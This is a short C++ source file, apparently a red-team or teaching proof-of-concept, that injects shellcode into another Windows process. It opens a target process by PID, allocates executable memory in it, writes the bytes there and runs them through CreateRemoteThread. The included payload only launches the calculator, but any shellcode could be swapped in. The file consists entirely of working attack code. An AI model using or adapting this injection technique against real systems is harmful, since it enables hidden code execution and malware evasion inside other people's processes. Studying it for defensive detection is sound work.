#include <windows.h>

#include "ulib.h"

int main(int argc, char** argv)
{
#if _WIN64 
  constexpr uint8_t shellcode[206] = ul::shellcodes::x64::pop_calc;
#else
  constexpr uint8_t shellcode[201] = ul::shellcodes::x86::pop_calc;
#endif

  // Try with C:\Windows\system32\notepad.exe or C:\Windows\SysWOW32\notepad.exe
  printf("Injecting to PID: %i", atoi(argv[1]));
  auto hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
  auto remoteBuffer =
      VirtualAllocEx(hProcess, NULL, sizeof(shellcode), (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
  WriteProcessMemory(hProcess, remoteBuffer, shellcode, sizeof(shellcode), NULL);
  auto remoteThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
  CloseHandle(hProcess);
}